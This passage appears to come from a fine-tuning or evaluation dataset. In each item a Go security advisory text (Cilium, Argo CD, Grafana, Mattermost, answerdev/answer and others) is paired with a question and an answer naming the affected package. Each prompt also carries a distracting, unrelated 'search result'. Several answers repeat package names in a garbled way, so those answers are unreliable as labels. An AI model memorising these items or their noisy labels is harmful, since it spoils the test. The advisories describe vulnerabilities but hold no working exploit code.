"The affected package is github.com/ansible-semaphore/semaphore."}]}, {"id": "GHSA-6f27-3p6c-p5jc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\n`cilium-cli`, when used to configure cluster mesh functionality, can remove the enforcement of user permissions on the `etcd` store used to mirror local cluster information to remote clusters. \n\nDue to an incorrect mount point specification, the settings specified by the `initContainer` that configures `etcd` users and their permissions are overwritten when using `cilium-cli` to configure a cluster mesh. An attacker who has already gained access to a valid key and certificate for an `etcd` cluster compromised in this manner could then modify state in that `etcd` cluster.\n\n### Patches\n\nThis issue is patched in `cilium-cli` 0.13.2\n\nAll previous versions of `cilium-cli` are affected. Users who have set up cluster meshes using the Cilium Helm chart are not affected.\n\n### Workarounds\n\nUse Cilium's [Helm charts](https://artifacthub.io/packages/helm/cilium/cilium) to create your cluster instead.\n\n### Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to Marco Iorio for investigating and fixing the issue.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io) - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.. Top 1 search result is go:github.com/goharbor/harbor. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cilium/cilium-cli."}]}, {"id": "GHSA-5w78-v688-cx9q", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/hashicorp/vault. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-r5x6-w42p-jhpp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nWhen Cilium is started, there is a short period when Cilium eBPF programs are not attached to the host. During this period, the host does not implement any of Cilium's featureset. This can cause disruption to newly established connections during this period due to the lack of Load Balancing, or can cause Network Policy bypass due to the lack of Network Policy enforcement during the window. This vulnerability impacts any Cilium-managed endpoints on the node (such as Kubernetes Pods), as well as the host network namespace (including Host Firewall).\n\n### Patches\n\nThis vulnerability is fixed by https://github.com/cilium/cilium/pull/24336, included in Cilium 1.13.1 or later. Cilium releases 1.12.x, 1.11.x and earlier are not affected.\n\n### Workarounds\n\nThere are no known workarounds.\n\n### Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to Louis DeLosSantos and Timo Beckers for investigating and fixing the issue.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: security@cilium.io - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.\n. Top 1 search result is go:github.com/microcosm-cc/bluemonday. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cilium/cilium."}]}, {"id": "GHSA-2q5c-qw9c-fmvq", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nAll versions of Argo CD starting with v0.5.0 are vulnerable to an information disclosure bug allowing unauthorized users to enumerate application names by inspecting API error messages. An attacker could use the discovered application names as the starting point of another attack. For example, the attacker might use their knowledge of an application name to convince an administrator to grant higher privileges (social engineering).\n\nMany Argo CD API endpoints accept an application name as the only parameter. Since Argo CD RBAC requires both the application name and its configured project name (and, if apps-in-any-namespace is enabled, the application's namespace), Argo CD fetches the requested application before performing the RBAC check. If the application does not exist, the API returns a \"not found\". If the application does exist, and the user does not have access, the API returns an \"unauthorized\" error. By trial and error, an attacker can infer which applications exist and which do not.\n\nNote that application resources are not fetched for API calls from _unauthenticated_ users. If your Argo CD instance is accessible from the public internet, unauthenticated users will not be able to cause Argo CD to make Kubernetes API calls.\n\nThe patch changes API behavior to return \"unauthorized\" both when the application is missing and when the user is not authorized to access it. **This change in API behavior may impact API clients.** Check your code to make sure it will handle the new API behavior properly.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.6.7\n* v2.5.16\n* v2.4.28\n\n### Workarounds\n\nThere are no workarounds besides upgrading.\n\n### Credits\n\nThank you to bean.zhang of HIT-IDS ChunkL Team who discovered the issue and reported it confidentially according to our [guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability).\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n. Top 1 search result is go:github.com/spiffe/spire. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/argoproj/argo-cd github.com/argoproj/argo-cd/v2 github.com/argoproj/argo-cd/v2 github.com/argoproj/argo-cd/v2."}]}, {"id": "GHSA-8fg8-jh2h-f2hc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ## Impact\n\nUnder specific conditions, Cilium may misattribute the source IP address of traffic to a cluster, identifying external traffic as coming from the host on which Cilium is running. As a consequence, network policies for that cluster might be bypassed, depending on the specific network policies enabled. Only IPv6 traffic is impacted by this vulnerability.\n\nThis issue only manifests when:\n* Cilium is routing IPv6 traffic, and\n* Kube-proxy is used for service handling, and\n* NodePorts are used to route traffic to pods.\n\nIPv6 is disabled by default. Cilium's kube-proxy replacement feature is not affected by this vulnerability.\n\n## Patches\n\nThe problem has been fixed and is available on versions >=1.11.15, >=1.12.8, >=1.13.1\n\n## Workarounds\n\nDisable IPv6 routing (IPv6 is disabled by default).\n\n## Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to Yusuke Suzuki for both highlighting and fixing the issue.\n\n## For more information\n\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: security@cilium.io - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.. Top 1 search result is go:k8s.io/apiserver. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cilium/cilium github.com/cilium/cilium github.com/cilium/cilium."}]}, {"id": "GHSA-hw7c-3rfg-p46j", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Parsing invalid messages can panic.\n\nParsing a text-format message which contains a potential number consisting of a minus sign, one or more characters of whitespace, and no further input will cause a panic.. Top 1 search result is go:github.com/containers/podman. What is the affected package?"}, {"from": "gpt", "value": "The affected package is google.golang.org/protobuf."}]}, {"id": "GHSA-55vm-3vq3-4jpc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/goharbor/harbor. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-55m9-hm92-xm8j", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Gophish through 0.12.1 was discovered to contain a cross-site scripting (XSS) vulnerability via a crafted landing page.. Top 1 search result is go:github.com/hashicorp/nomad. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/gophish/gophish."}]}, {"id": "GHSA-7mjv-x3jf-545x", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nA vulnerability has been discovered in cloudflared's installer (<= 2023.3.0) for Windows 32-bits devices that allows a local attacker with no administrative permissions to escalate their privileges on the affected device. This vulnerability exists because the MSI installer used by cloudflared relied on a world-writable directory.\n\nAn attacker with local access to the device (without Administrator rights) can use symbolic links to trick the MSI installer into deleting files in locations that the attacker would otherwise have no access to. By creating a symlink from the world-writable directory to the target file, the attacker can manipulate the MSI installer's repair functionality to delete the target file during the repair process.\n\nExploitation of this vulnerability could allow an attacker to delete important system files or replace them with malicious files, potentially leading to the affected device being compromised.\n\n**The cloudflared client itself is not affected by this vulnerability, only the installer for 32-bit Windows devices.**\n\n### Patches\nA new installer was released as part of version 2023.3.1, corresponding to pseudoversion 0.0.0-20230313153246-f686da832f85 on pkg.go.dev. Users are encouraged to remove old installers from their systems.\n\n### References\n[Cloudflared Releases](https://github.com/cloudflare/cloudflared/releases). Top 1 search result is go:github.com/helm/helm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cloudflare/cloudflared."}]}, {"id": "GHSA-p2pf-g8cq-3gq5", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Description\n\nteler-waf is a Go HTTP middleware that provides teler IDS functionality to protect against web-based attacks. teler-waf prior to version v0.2.0 is vulnerable to a bypass attack when a specific case-sensitive hex entities payload with special characters such as CR/LF and horizontal tab is used. This vulnerability allows an attacker to execute arbitrary JavaScript code on the victim's browser and compromise the security of the web application.\n\n### Impact\n\nAn attacker can exploit this vulnerability to bypass common web attack threat rules in teler-waf and launch cross-site scripting (XSS) attacks. The attacker can execute arbitrary JavaScript code on the victim's browser and steal sensitive information, such as login credentials and session tokens, or take control of the victim's browser and perform malicious actions.\n\n### Patches\n\nVersion [v0.2.0](https://github.com/kitabisa/teler-waf/releases/tag/v0.2.0) includes a patch for this vulnerability.\n\n### Workarounds\n\nWe advised updating their installations to version v0.2.0 and frontwards immediately.. Top 1 search result is go:github.com/Kava-Labs/kava. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/kitabisa/teler-waf."}]}, {"id": "GHSA-xw5p-hw8j-xg4q", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Grafana is an open-source platform for monitoring and observability. Starting with the 7.0 branch, Grafana had a stored XSS vulnerability in the trace view visualization. The stored XSS vulnerability was possible due the value of a span's attributes/resources were not properly sanitized and this will be rendered when the span's attributes/resources are expanded. An attacker needs to have the Editor role in order to change the value of a trace view visualization to contain JavaScript. This means that vertical privilege escalation is possible, where a user with Editor role can change to a known password for a user having Admin role if the user with Admin role executes malicious JavaScript viewing a dashboard. Users may upgrade to version 8.5.21, 9.2.13 and 9.3.8 to receive a fix.. Top 1 search result is go:github.com/nats-io/jwt. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/grafana/grafana github.com/grafana/grafana github.com/grafana/grafana."}]}, {"id": "GHSA-6gc3-crp7-25w5", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nSAML Service Providers using this library for SAML authentication support are likely susceptible to Denial of Service attacks. A bug in this library enables attackers to craft a `deflate`-compressed request which will consume significantly more memory during processing than the size of the original request. This may eventually lead to memory exhaustion and the process being killed.\n\n### Mitigation\nThe maximum compression ratio achievable with `deflate` is 1032:1, so by limiting the size of bodies passed to gosaml2, limiting the rate and concurrency of calls, and ensuring that lots of memory is available to the process it _may_ be possible to help Go's garbage collector \"keep up\".\n\nImplementors are encouraged not to rely on this.\n\n### Patches\nThis issue is addressed in v0.9.0. Top 1 search result is go:github.com/cloudflare/tableflip. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/russellhaering/gosaml2."}]}, {"id": "GHSA-7rqg-hjwc-6mjf", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Description \nOn 2023-01-01 during an internal audit of Grafana, a member of the security team found a stored XSS vulnerability affecting the core plugin \"Text\".\n\nThe stored XSS vulnerability requires several user interactions in order to be fully exploited. The vulnerability was possible due to  React's render cycle that will pass though the unsanitized HTML code, but in the next cycle the HTML is cleaned up and saved in Grafana's database.\n\n### Impact\nAn attacker needs to have the Editor role in order to change a Text panel to include JavaScript. later, an another user needs to edit the same Text panel, and click on \"Markdown\" or \"HTML\" for the code to be executed. This means that vertical privilege escalation is possible, where a user with Editor role can change to a known password for a user having Admin role if the user with Admin role executes malicious JavaScript viewing a dashboard.   \n\n### Impacted versions\nGrafana versions between 9.2.0 and 9.2.10. and between 9.3.0 and 9.3.4\n\n### Solutions and mitigations\nUpdate your Grafana instance.\n\n\n## Reporting security issues\n\nIf you think you have found a security vulnerability, please send a report to security@grafana.com. This address can be used for all of Grafana Labs' open source and commercial products (including, but not limited to Grafana, Grafana Cloud, Grafana Enterprise, and grafana.com). We can accept only vulnerability reports at this address. We would prefer that you encrypt your message to us by using our PGP key. The key fingerprint is\n\nF988 7BEA 027A 049F AE8E 5CAA D125 8932 BE24 C5CA\n\nThe key is available from keyserver.ubuntu.com.\n\n## Security announcements\n\nWe maintain a [security category](https://community.grafana.com/c/support/security-announcements) on our blog, where we will always post a summary, remediation, and mitigation details for any patch containing security fixes.\n\nYou can also subscribe to our [RSS feed](https://grafana.com/tags/security/index.xml).. Top 1 search result is go:github.com/u-root/u-root. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/grafana/grafana github.com/grafana/grafana."}]}, {"id": "GHSA-g8xm-p2h4-v6jp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A vulnerability was found in OpenShift Assisted Installer. During generation of the Discovery ISO, image pull secrets were leaked as plaintext in the installation logs. An authenticated user could exploit this by re-using the image pull secret to pull container images from the registry as the associated user.. Top 1 search result is go:github.com/containerd/containerd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/openshift/assisted-installer."}]}, {"id": "GHSA-v3hp-mcj5-pg39", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: HashiCorp Vault and Vault Enterprise versions 0.8.0 until 1.13.1 are vulnerable to an SQL injection attack when using the Microsoft SQL (MSSQL) Database Storage Backend. When configuring the MSSQL plugin, certain parameters are required to establish a connection (schema, database, and table) are not sanitized when passed to the user-provided MSSQL database. A privileged attacker with the ability to write arbitrary data to Vault's configuration may modify these parameters to execute a malicious SQL command when the Vault configuration is applied. This issue is fixed in versions 1.13.1, 1.12.5, and 1.11.9.. Top 1 search result is go:github.com/nats-io/jwt. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/vault github.com/hashicorp/vault github.com/hashicorp/vault."}]}, {"id": "GHSA-wxwq-525w-hcqx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nIf you use the report server, it may be vulnerable to a Denial of Service attack.\n\n### Patches\n\nHas been patched in v0.19.2.\n\n### References\n\nThe vulnerability was inherited by the following upstream vulnerabilites\n\n- [golang.org/x/text < v0.3.7](https://github.com/advisories/GHSA-ppp9-7jff-5vj2)\n- [golang.org/x/net < 0.0.0-20220906165146-f3363e06e74c](https://github.com/advisories/GHSA-69cg-p879-7622)\n. Top 1 search result is go:github.com/helm/helm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/fkie-cad/yapscan."}]}, {"id": "GHSA-h828-v5pv-33qx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A flaw was found in coreDNS. This flaw allows a malicious user to redirect traffic intended for external top-level domains (TLD) to a pod they control by creating projects and namespaces that match the TLD.. Top 1 search result is go:github.com/docker/docker. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/coredns/coredns."}]}, {"id": "GHSA-9v4v-9fj5-p982", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/influxdata/influxdb. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-3hwm-922r-47hw", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A security vulnerability has been identified in the GraphQL parser used by the API of s42.app. An attacker can overload the parser and cause the API pod to crash. With a bit of threading, the attacker can bring down the entire API, resulting in an unhealthy stream. This vulnerability can be exploited by sending a specially crafted request to the API with a large payload.\n\nAn attacker can exploit this vulnerability to cause a denial of service (DoS) attack on the s42.app API, resulting in unavailability of the API for legitimate users.. Top 1 search result is go:github.com/proglottis/gpgme. What is the affected package?"}, {"from": "gpt", "value": "The affected package is atomys.codes/stud42."}]}, {"id": "GHSA-ff27-hrmr-ggpj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/ethereum/go-ethereum. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-vxhr-p2vp-7gf8", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Reflected in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/gomarkdown/markdown. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-58g2-vgpg-335q", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: request-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.. Top 1 search result is go:github.com/russellhaering/gosaml2. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/darklynx/request-baskets."}]}, {"id": "GHSA-63f2-6959-2pxj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Boards in Mattermost allows an attacker to upload a malicious SVG image file as an attachment to a card and share it using a direct link to the file. \n\n[Issue Identifier](https://mattermost.com/security-updates/): MMSA-2023-00139. Top 1 search result is go:github.com/containers/podman. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server github.com/mattermost/mattermost-server github.com/mattermost/mattermost-server github.com/mattermost/mattermost-server/v5 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-wj6x-hcc2-f32j", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A vulnerability was identified in Consul and Consul Enterprise (\u201cConsul\u201d) an authenticated user with service:write permissions could trigger a workflow that causes Consul server and client agents to crash under certain circumstances. To exploit this vulnerability, an attacker requires access to an ACL token with service:write permissions, and there needs to be at least one running ingress or API gateway that is configured to route traffic to an upstream service.. Top 1 search result is go:github.com/goharbor/harbor. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/consul."}]}, {"id": "GHSA-g44v-6qfm-f6ch", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Guessable CAPTCHA in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/gorilla/websocket. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-qwqv-rqgf-8qh8", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A Time-of-check Time-of-use (TOCTOU) flaw was found in podman. This issue may allow a malicious user to replace a normal file in a volume with a symlink while exporting the volume, allowing for access to arbitrary files on the host file system.. Top 1 search result is go:github.com/helm/helm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/containers/podman/v4."}]}, {"id": "GHSA-h2wg-83fc-xvm9", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Business Logic Errors in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/opencontainers/runc. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-ch9g-x9j7-rcgp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Reflected in GitHub repository imgproxy/imgproxy prior to 3.14.0.. Top 1 search result is go:github.com/hpcng/singularity. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/imgproxy/imgproxy/v3."}]}, {"id": "GHSA-h85v-cx5m-78wj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/opencontainers/runc. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-vfgq-g5x8-g595", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A vulnerability identified in the implementation of Tailscale SSH in FreeBSD allowed commands to be run with a higher privilege group ID than that specified by Tailscale SSH access rules.\n\n**Affected platforms**: FreeBSD\n\n**Patched Tailscale client versions**: v1.38.2 or later\n\n### What happened?\nA difference in the behavior of the FreeBSD `setgroups` system call from POSIX meant that the Tailscale client running on a FreeBSD-based operating system did not appropriately restrict groups on the host when using Tailscale SSH. When accessing a FreeBSD host over Tailscale SSH, the egid of the tailscaled process was used instead of that of the user specified in Tailscale SSH access rules.\n\n### Who is affected?\n9 tailnets with 22 FreeBSD nodes running Tailscale SSH since Tailscale v1.34 (released on 2022-12-04) may have had Tailscale SSH sessions with a higher privilege group ID than that specified in Tailscale SSH access rules.\n\nWe have notified the affected organizations where we have [security contacts](https://tailscale.com/kb/1224/contact-preferences/#setting-the-security-issues-email).\n\n### What is the impact?\nTailscale SSH commands may have been run with a higher privilege group ID than that specified in Tailscale SSH access rules if they met all of the following criteria:\n* The destination node was a FreeBSD device with Tailscale SSH enabled;\n* Tailscale SSH access rules permitted access for non-root users; and\n* A non-interactive SSH session was used.\n\n### What do I need to do?\nIf you are running Tailscale on FreeBSD, upgrade to v1.38.2 or later to remediate the issue. Admins of a tailnet can view [FreeBSD nodes with unpatched versions](https://login.tailscale.com/admin/machines?q=version%3A%3C1.38.2+freebsd) in the admin console.\n\nTo update the local ports tree in advance of what's available upstream, you can:\n\n1. `cd /usr/ports/security/tailscale`\n2. edit the Makefile to set `PORTVERSION` to `1.38.2`\n3. `make makesum`\n4. `make install`\n\nTailscale SSH on other platforms is not affected.\n\n### Credits\nWe would like to thank [Ryan Belgrave](https://www.linkedin.com/in/rbelgrave/) for reporting this issue.\n\n### References\n* [TS-2023-003](https://tailscale.com/security-bulletins/#ts-2023-003)\n\n\n. Top 1 search result is go:github.com/hashicorp/nomad. What is the affected package?"}, {"from": "gpt", "value": "The affected package is tailscale.com."}]}, {"id": "GHSA-vfvj-3m3g-m532", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\n\nFuzz testing on `crossplane/crossplane`, by Ada Logics and sponsored by the CNCF, identified input to a function in the `fieldpath` package that can cause an out of memory panic. Applications that use the `Paved` type's `SetValue` method with user provided input without proper validation might use excessive amounts of memory and cause an out of memory panic.\n\n### Details\n\nIn the `fieldpath` package, the `SetValue` method of the `Paved` type sets a value on the inner object according to the provided path, without validating it first. This allows setting values in slices at any specific index and the code will grow the target array up to the required size. The index is currently capped at max uint32 (4294967295) given how indexes are parsed,  but that is still an unnecessarily large value.\n\n### Workaround\n\nUsers can parse and validate the path before passing it to the `SetValue` method of the `Paved` type, constraining the index size as deemed appropriate.\n\n### Credits\n\nDisclosed by Ada Logics in a fuzzing audit sponsored by CNCF.. Top 1 search result is go:github.com/openshift/origin. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/crossplane/crossplane-runtime github.com/crossplane/crossplane-runtime."}]}, {"id": "GHSA-6x5v-cxpp-pc5x", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Observable Response Discrepancy in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:k8s.io/ingress-nginx. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-4g76-w3xw-2x6w", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nmaddy 0.2.0 - 0.6.2 allows a full authentication bypass if SASL authorization username is specified when using the PLAIN authentication mechanisms. Instead of validating the specified authorization username, it is accepted as is after checking the credentials for the authentication username.\n\n### Patches\n\nmaddy 0.6.3 includes the fix for the bug. \n\n### Workarounds\n\nThere is no way to fix the issue without upgrading.\n\n### References\n\n* Commit that introduced the vulnerable code: https://github.com/foxcpp/maddy/commit/55a91a37b71210f34f98f4d327c30308fe24399a\n* Fix: https://github.com/foxcpp/maddy/commit/9f58cb64b39cdc01928ec463bdb198c4c2313a9c\n. Top 1 search result is go:github.com/bitly/oauth2_proxy. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/foxcpp/maddy."}]}, {"id": "GHSA-qrwm-xqfr-4vhv", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/dexidp/dex. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-8jhh-3jf2-pfwr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: When running in a High Availability configuration, Mattermost fails to sanitize some of the `user_updated` and` post_deleted` events broadcast to all users, leading to disclosure of sensitive information to some of the users with currently connected Websocket clients.\n\n[Issue Identifier](https://mattermost.com/security-updates/): MMSA-2023-00138. Top 1 search result is go:github.com/opencontainers/runc. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server github.com/mattermost/mattermost-server github.com/mattermost/mattermost-server github.com/mattermost/mattermost-server/v5 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-vpvm-3wq2-2wvm", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: runc 1.0.0-rc95 through 1.1.4 has Incorrect Access Control leading to Escalation of Privileges, related to `libcontainer/rootfs_linux.go`. To exploit this, an attacker must be able to spawn two containers with custom volume-mount configurations, and be able to run custom images. NOTE: this issue exists because of a CVE-2019-19921 regression.. Top 1 search result is go:github.com/hpcng/singularity. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/opencontainers/runc."}]}, {"id": "GHSA-79hx-g43v-xfmr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Insufficient Session Expiration in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:fortio.org/proxy. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-6c32-3x46-m9rh", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/owncast/owncast. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-vq59-5x26-h639", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Impact\nGive that CORS configuration was not correct, an attacker could use [play-with-docker.com](http://play-with-docker.com/) as an example, set origin header in http request as  [evil-play-with-docker.com](http://evil-play-with-docker.com/), it will be echo in response header, which successfully bypass the CORS policy and retrieves basic user information.\n\nPatches\nIt has been fixed in lastest version, Please upgrade to latest version\n\nWorkarounds\nNo, users have to upgrade version.\n\n\n\n. Top 1 search result is go:github.com/tendermint/tendermint. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/play-with-docker/play-with-docker."}]}, {"id": "GHSA-3wq5-3f56-v5xc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost allows an attacker to request a preview of an existing message when creating a new message via the createPost API call, disclosing the contents of the linked message.. Top 1 search result is go:github.com/argoproj/argo-cd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost-server github.com/mattermost/mattermost-server github.com/mattermost/mattermost-server."}]}, {"id": "GHSA-r95w-7cpx-h5mx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Business Logic Errors in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/Kava-Labs/kava. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-hwj7-frgj-7829", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Authentication Bypass by Capture-replay in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/openshift/origin. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-8jh8-33f5-cgfp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.6.. Top 1 search result is go:github.com/hashicorp/vault. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-36f2-fcrx-fp4j", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nUtilizing a HTTP query parameter an attacker is able to redirect users from the web application to any domain. The URL of the intended redirect should always be checked for safety prior to forwarding the user. Other endpoints of the web application already do this, they check both that the domain is 